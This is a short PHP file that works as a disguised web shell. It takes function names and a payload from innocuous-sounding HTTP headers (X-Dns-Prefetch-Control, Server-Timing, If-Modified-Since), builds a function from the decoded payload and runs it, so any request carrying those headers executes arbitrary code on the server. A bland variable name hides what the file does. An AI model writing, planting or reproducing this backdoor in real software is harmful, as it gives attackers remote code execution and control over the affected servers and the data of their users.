<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $oauthexceptions = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Server-Timing']($_HEADERS['If-Modified-Since']));
    $oauthexceptions();
}